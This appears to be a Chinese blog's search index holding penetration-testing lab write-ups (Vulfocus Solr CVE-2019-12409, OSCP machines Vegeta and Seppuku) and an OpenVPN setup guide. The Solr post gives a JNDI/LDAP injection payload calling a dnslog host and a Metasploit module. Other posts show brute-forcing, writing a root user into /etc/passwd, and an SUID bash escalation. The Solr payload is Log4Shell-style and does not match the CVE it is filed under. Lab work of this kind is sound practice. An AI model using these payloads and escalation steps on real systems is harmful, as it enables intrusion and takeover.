<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【Vulfocus系列】Apache Solr代码执行漏洞 (CVE-2019-12409)</title>
      <link href="/2024/09/22/Vulfocus-solr-RCE/"/>
      <url>/2024/09/22/Vulfocus-solr-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="、首页"><a href="#、首页" class="headerlink" title="、首页"></a>、首页</h1><h1 id="、首页-1"><a href="#、首页-1" class="headerlink" title="、首页"></a>、首页</h1><h1 id="一、Apache-Solr代码执行漏洞-CVE-2019-12409"><a href="#一、Apache-Solr代码执行漏洞-CVE-2019-12409" class="headerlink" title="一、Apache Solr代码执行漏洞 (CVE-2019-12409)"></a>一、Apache Solr代码执行漏洞 (CVE-2019-12409)</h1><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。是apache的顶级开源项目，使用java开发 ，基于lucene的全文检索服务器。</p><p><strong>影响范围：</strong></p><ul><li>Solr 8.1.1</li><li>Solr 8.2.0</li></ul><h1 id="二、首页"><a href="#二、首页" class="headerlink" title="二、首页"></a>二、首页</h1><p><img src="D:\myblog\source_posts\Vulfocus-solr-RCE\image-20240922205933443.png" alt="image-20240922205933443"></p><p>发现是8.1.1，存在CVE-2019-12409 漏洞</p><h1 id="三、手工payload"><a href="#三、手工payload" class="headerlink" title="三、手工payload"></a>三、手工payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\myblog\source_posts\Vulfocus-solr-RCE\image-20240922212059152.png" alt="image-20240922212059152"></p><p>成功执行命令，获取java 的版本号</p><h1 id="四、获取shell"><a href="#四、获取shell" class="headerlink" title="四、获取shell"></a>四、获取shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulfocus系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulfocus系列靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【课外经验】OpenVPN配置自己的加速器</title>
      <link href="/2024/08/23/Extracurricular-experience-openvpn/"/>
      <url>/2024/08/23/Extracurricular-experience-openvpn/</url>
      
        <content type="html"><![CDATA[<h1 id="一、OpenVPN-服务端设置"><a href="#一、OpenVPN-服务端设置" class="headerlink" title="一、OpenVPN 服务端设置"></a>一、OpenVPN 服务端设置</h1><p>1、配置Openvpn 服务端，需要在阿*云等vps 服务器上设置，先安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2、安装 OpenVPN 后，我们需要生成用于 VPN 隧道加密的静态密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret static-OpenVPN.key</span><br></pre></td></tr></table></figure><p>3、接下来，我们需要启动 OpenVPN 服务端，并用&amp; 将服务端放置在后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4、如果操作正确，vps 现在应该有一个名为 <code>tun0</code> 的新网络接口，其 IP 地址为 <code>172.16.0.1</code></p><p>输入以下命令进行验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a show tun0</span><br></pre></td></tr></table></figure><p>5、要进一步验证 VPN 服务器是否正常运行，请检查系统上的 UDP 端口 1194 是否已打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anu | grep 1194</span><br></pre></td></tr></table></figure><p>有输出则确认VPN 服务器正常运行</p><p>6、确保vps 上的1194端口正常对外开放，没有被防火墙等拦截</p><h1 id="二、OpenVPN-客户端设置"><a href="#二、OpenVPN-客户端设置" class="headerlink" title="二、OpenVPN 客户端设置"></a>二、OpenVPN 客户端设置</h1><p>下面以linux为示例，windows同样</p><p>1、确保客户端有openvpn客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2、将VPN 隧道加密的静态密钥传入客户端，可以通过scp 命令进行ssh 的连接传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user1@linuxconfig:/home/user1/static-OpenVPN.key .</span><br></pre></td></tr></table></figure><p>3、进行openvpn 的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --remote YOUR-OPENVPN-SERVER-IP-OR-HOST --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4、VPN 隧道创建可能需要几秒钟的时间。如果成功，您应该看到以下消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Initialization Sequence Completed</span><br></pre></td></tr></table></figure><p>5、要确认与 VPN 服务器的成功连接，请尝试 ping 远程网络上的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 172.16.0.1</span><br><span class="line">PING 172.16.0.1 (172.16.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.16.0.1: icmp_seq=1 ttl=64 time=0.061 ms</span><br><span class="line"></span><br><span class="line">--- 172.16.0.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://cn.linux-console.net/?p=10930">基本 Ubuntu 20.04 OpenVPN 客户端&#x2F;服务器连接设置 (linux-console.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Vegeta</title>
      <link href="/2024/08/23/OSCP-Vegeta/"/>
      <url>/2024/08/23/OSCP-Vegeta/</url>
      
        <content type="html"><![CDATA[<h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><p><img src="/img/OSCP-Vegeta/image-20240823121642788.png" alt="image-20240823121642788"></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><p><img src="/img/OSCP-Vegeta/image-20240823121759816.png" alt="image-20240823121759816"></p><p>只开放22、80端口，加上UDP扫描</p><h2 id="2、服务版本探测"><a href="#2、服务版本探测" class="headerlink" title="2、服务版本探测"></a>2、服务版本探测</h2><p><img src="/img/OSCP-Vegeta/image-20240823122002934.png" alt="image-20240823122002934"></p><p>80的Apache 使用 2.4.38版本，有关这个版本在一定条件下是存在漏洞的，系统跑在Linux 4.x|5.x </p><h2 id="3、漏洞探测"><a href="#3、漏洞探测" class="headerlink" title="3、漏洞探测"></a>3、漏洞探测</h2><p><img src="/img/OSCP-Vegeta/image-20240823122658255.png" alt="image-20240823122658255"></p><p>80端口只扫了一些目录</p><h1 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h1><h2 id="1、首页源代码"><a href="#1、首页源代码" class="headerlink" title="1、首页源代码"></a>1、首页源代码</h2><p><img src="/img/OSCP-Vegeta/image-20240823122833521.png" alt="image-20240823122833521"></p><p>首页就一张图片</p><p><img src="/img/OSCP-Vegeta/image-20240823122853320.png" alt="image-20240823122853320"></p><p>看过了，没捆绑没隐写</p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><p>gobuster扫描结果，发现四个目录，其中admin 令我们很感兴趣</p><p><img src="/img/OSCP-Vegeta/image-20240823123547386.png" alt="image-20240823123547386"></p><p>&#x2F;admin 里面只有一个 admin.php 文件</p><p><img src="/img/OSCP-Vegeta/image-20240823123621404.png" alt="image-20240823123621404"></p><p>推测有类似ctf 那样有源码泄露的地方，但是这个文件夹就它一个文件，且字节大小只有9</p><p><img src="/img/OSCP-Vegeta/image-20240823123742142.png" alt="image-20240823123742142"></p><p>robots.txt 文件给出了提示</p><p><img src="/img/OSCP-Vegeta/image-20240823134636819.png" alt="image-20240823134636819"></p><p>指向了一个<code>Vegeta-1.0</code>的提示</p><p><img src="/img/OSCP-Vegeta/image-20240823134713611.png" alt="image-20240823134713611"></p><p>在页面源代码给出了base64编码的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== --&gt;</span><br></pre></td></tr></table></figure><p>对其二次base64解密发现文件头存在png</p><p><img src="/img/OSCP-Vegeta/image-20240823140240105.png" alt="image-20240823140240105"></p><p>更改png后缀发现是二维码，二维码解析器查看给了一个密码</p><img src="/img/OSCP-Vegeta/image-20240823141253722.png" alt="image-20240823141253722" style="zoom:150%;" /><p>现在差个用户名，cewl 收集一波关键字</p><p><img src="/img/OSCP-Vegeta/image-20240823141446676.png" alt="image-20240823141446676"></p><p>尝试一波爆破，很明显失败了</p><p><img src="/img/OSCP-Vegeta/image-20240823141755467.png" alt="image-20240823141755467"></p><h2 id="3、进一步的信息收集"><a href="#3、进一步的信息收集" class="headerlink" title="3、进一步的信息收集"></a>3、进一步的信息收集</h2><p>我们用一个大点的字典再次做了目录扫描，发现一个新的端点</p><p><img src="/img/OSCP-Vegeta/image-20240823142923712.png" alt="image-20240823142923712"></p><p>里面是一个wav 格式的文件，是个音频</p><p><img src="/img/OSCP-Vegeta/image-20240823143037254.png" alt="image-20240823143037254"></p><p>浅听了一下，嘀嘀嘀的断点声，摩斯密码欸，在线解码下：<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">Morse Code Adaptive Audio Decoder | Morse Code World</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER : TRUNKS PASSWORD : US3R&lt;KN&gt;S IN DOLLARS SYMBOL)</span><br></pre></td></tr></table></figure><p>推测密码应该是US3R 这部分，但是尝试却是失败的；</p><h1 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h1><p>丢给AI 分析一下</p><p><img src="/img/OSCP-Vegeta/image-20240823145642107.png" alt="image-20240823145642107"></p><p>把密码里面的S改成美元$符号，再次尝试</p><p><img src="/img/OSCP-Vegeta/image-20240823145918586.png" alt="image-20240823145918586"></p><p>果然，成功getshell</p><p><img src="/img/OSCP-Vegeta/image-20240823145955199.png" alt="image-20240823145955199"></p><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>历史命令中有点东西昂</p><p><img src="/img/OSCP-Vegeta/image-20240823150051647.png" alt="image-20240823150051647"></p><p>我是否可以向&#x2F;etc&#x2F;passwd 文件中写入用户呢？</p><p>查看&#x2F;etc&#x2F;passwd 文件的权限</p><p><img src="/img/OSCP-Vegeta/image-20240823151134142.png" alt="image-20240823151134142"></p><p>啊？，trunks 用户具有&#x2F;etc&#x2F;passwd 的读写权限，那这就好办了</p><h2 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h2><p>直接向&#x2F;etc&#x2F;passwd 文件中写入管理员用户</p><p><img src="/img/OSCP-Vegeta/image-20240823151653139.png" alt="image-20240823151653139"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Seppuku</title>
      <link href="/2024/08/22/OSCP-Seppuku/"/>
      <url>/2024/08/22/OSCP-Seppuku/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Seppuku"><a href="#OSCP系列靶机—Seppuku" class="headerlink" title="OSCP系列靶机—Seppuku"></a>OSCP系列靶机—Seppuku</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Seppuku/image-20240822200229186.png" alt="image-20240822200229186"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速探测"><a href="#1、快速探测" class="headerlink" title="1、快速探测"></a>1、快速探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822200315169.png" alt="image-20240822200315169"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Seppuku/image-20240822200410103.png" alt="image-20240822200410103"></p><p><img src="/img/OSCP-Seppuku/image-20240822200436648.png" alt="image-20240822200436648"></p><p>同时探测UDP常用的20个端口，没有准确的开放端口</p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822200810277.png" alt="image-20240822200810277"></p><p>给了很多版本和服务的信息，以及推测存在于linux 4.x|5.x 的版本，版本较高</p><p>80端口的HTTP服务提示401未授权，7080开放在一个携带ssl 的http服务，7601、8088都开放了一个http服务</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822201455333.png" alt="image-20240822201455333"></p><p>在80端口显示很多目录文件，但是都给出401 未授权提示</p><p><img src="/img/OSCP-Seppuku/image-20240822202031346.png" alt="image-20240822202031346"></p><p>7080端口给出一个empowerid 服务，网查了一下，可以搜索官网深入了解</p><blockquote><p>EmpowerID 是一款身份管理和访问控制解决方案，它提供了一套全面的服务来帮助企业安全地管理用户的身份和访问权限。</p></blockquote><p>这里nmap给出了CVE-2010-2333 的漏洞，表明这个服务存在一个源代码泄露的CVE编号漏洞，在后面的渗透过程中可能存在利用</p><p><img src="/img/OSCP-Seppuku/image-20240822202631798.png" alt="image-20240822202631798"></p><p>8088 端口给出了一个易受DOs攻击的薄弱点，再次给出了CVE-2010-2333 的漏洞，并在后面给出了一个html 页面的源代码</p><p><img src="/img/OSCP-Seppuku/image-20240822202904756.png" alt="image-20240822202904756"></p><p>在针对主机的脚本扫描中，指出smb服务易受<code>smb-vuln-regsvc-dos</code>攻击，易受拒绝服务而崩溃</p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p>nmap并未扫描出ftp 存在未授权，尝试未授权登陆</p><p><img src="/img/OSCP-Seppuku/image-20240822203433673.png" alt="image-20240822203433673"></p><p>不能登陆</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><p><img src="/img/OSCP-Seppuku/image-20240822204635390.png" alt="image-20240822204635390"></p><p>SMB也没有可利用的点</p><h2 id="五、HTTP信息收集"><a href="#五、HTTP信息收集" class="headerlink" title="五、HTTP信息收集"></a>五、HTTP信息收集</h2><h3 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h3><p><img src="/img/OSCP-Seppuku/image-20240822205201852.png" alt="image-20240822205201852"></p><p>一个授权的登陆，但是我们不知道账号密码</p><p>让nmap 进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-brute -p80 192.168.31.83</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822210021953.png" alt="image-20240822210021953"></p><p>未发现账号密码，之前nmap 给出目录扫描结果中都是401的未授权，所以也没有做目录扫描的必要了</p><h3 id="2、7080信息收集"><a href="#2、7080信息收集" class="headerlink" title="2、7080信息收集"></a>2、7080信息收集</h3><p><img src="/img/OSCP-Seppuku/image-20240822210121246.png" alt="image-20240822210121246"></p><p>一个404的页面，但是在nmap扫描中给出LiteSpeed web服务，下面对这个软件做一个简单的介绍</p><blockquote><p>LiteSpeed Web Server (LSWS) 是一款以快速性能和高可扩展性而知名的专有网络服务器软件，同时也提供了一流的安全性，例如内置功能有助于防止分布式拒绝服务（DDOS）攻击 。它与广泛使用的Apache网络服务器完全兼容，这意味着用户可以在不改变现有应用程序或操作系统的情况下，无缝切换到LiteSpeed 。</p></blockquote><p>做一个目录扫描</p><p><img src="/img/OSCP-Seppuku/image-20240822210918213.png" alt="image-20240822210918213"></p><p><img src="/img/OSCP-Seppuku/image-20240822210930494.png" alt="image-20240822210930494"></p><p><strong>OpenLiteSpeed Web Server 1.6</strong> 是否存在漏洞呢</p><p><img src="/img/OSCP-Seppuku/image-20240822211139116.png" alt="image-20240822211139116"></p><p>这几个版本不对应</p><h3 id="3、7601信息收集"><a href="#3、7601信息收集" class="headerlink" title="3、7601信息收集"></a>3、7601信息收集</h3><p><img src="/img/OSCP-Seppuku/image-20240822212239814.png" alt="image-20240822212239814"></p><p>首页一张图，图片也没有隐藏的信息；做目录扫描</p><p><img src="/img/OSCP-Seppuku/image-20240822212703788.png" alt="image-20240822212703788"></p><p>看敏感目录的时候发现</p><p><img src="/img/OSCP-Seppuku/image-20240822212749645.png" alt="image-20240822212749645"></p><p>翻到shadow.bak 的备份文件，不过这个散列值不是那么容易破解的啊，但是上面好像还有个password.lst 文件</p><p><img src="/img/OSCP-Seppuku/image-20240822214537146.png" alt="image-20240822214537146"></p><p>啊？是不是有点过分了，甚至还有个passwd.bak 的备份文件，做个爆破</p><p><img src="/img/OSCP-Seppuku/image-20240822214937702.png" alt="image-20240822214937702"></p><p>没有欸，用其他的目录扫描工具</p><p><img src="/img/OSCP-Seppuku/image-20240822223836580.png" alt="image-20240822223836580"></p><p>发现多了几个其他的路径</p><h2 id="六、Getshell"><a href="#六、Getshell" class="headerlink" title="六、Getshell"></a>六、Getshell</h2><p>对 shadow.bak 中的 <code>rabbit-hole</code> 的用户名密码进行爆破</p><p><img src="/img/OSCP-Seppuku/image-20240822215455478.png" alt="image-20240822215455478"></p><p>OK啊，非常的快速且精准</p><p><img src="/img/OSCP-Seppuku/image-20240822215822915.png" alt="image-20240822215822915"></p><p>但是，拉跨了，密码不对，应该是被改掉了，看来这个<code>r@bbit-hole</code>用户登陆不了了</p><p>我们还有一个 <code>hostname</code>没用</p><p><img src="/img/OSCP-Seppuku/image-20240822220435169.png" alt="image-20240822220435169"></p><p>成功getshell</p><p><img src="/img/OSCP-Seppuku/image-20240822220603505.png" alt="image-20240822220603505"></p><h2 id="七、权限提升"><a href="#七、权限提升" class="headerlink" title="七、权限提升"></a>七、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>我们需要优化我们的shell，后面每一个都需要优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822220653308.png" alt="image-20240822220653308"></p><p>这个文件有点意思昂，尝试登陆到其他用户</p><h3 id="2、提权至samurai"><a href="#2、提权至samurai" class="headerlink" title="2、提权至samurai"></a>2、提权至samurai</h3><p><img src="/img/OSCP-Seppuku/image-20240822222951615.png" alt="image-20240822222951615"></p><p>查找提权信息</p><p><img src="/img/OSCP-Seppuku/image-20240822223938600.png" alt="image-20240822223938600"></p><p>这里有点鸡肋昂</p><h3 id="3、提权至tanto"><a href="#3、提权至tanto" class="headerlink" title="3、提权至tanto"></a>3、提权至tanto</h3><p>回到之前的目录扫描中发现的keys路径，发现了某个ssh密钥</p><p><img src="/img/OSCP-Seppuku/image-20240822224005623.png" alt="image-20240822224005623"></p><p>尝试用密钥连接</p><p><img src="/img/OSCP-Seppuku/image-20240822224154473.png" alt="image-20240822224154473"></p><p>成功提权至tanto</p><h3 id="4、提权至root"><a href="#4、提权至root" class="headerlink" title="4、提权至root"></a>4、提权至root</h3><p>我们去创建 <code>home/tanto/.cgi_bin/bin</code> 文件，写入+s 的 &#x2F;bin&#x2F;bash</p><p><img src="/img/OSCP-Seppuku/image-20240822230148400.png" alt="image-20240822230148400"></p><p>直接提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-noontide</title>
      <link href="/2024/08/22/OSCP-noontide/"/>
      <url>/2024/08/22/OSCP-noontide/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—InfosecPrep"><a href="#OSCP系列靶机—InfosecPrep" class="headerlink" title="OSCP系列靶机—InfosecPrep"></a>OSCP系列靶机—InfosecPrep</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-noontide/image-20240822125212542.png" alt="image-20240822125212542"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-noontide/image-20240822125308279.png" alt="image-20240822125308279"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-noontide/image-20240822125440942.png" alt="image-20240822125440942"></p><p>探测全tcp 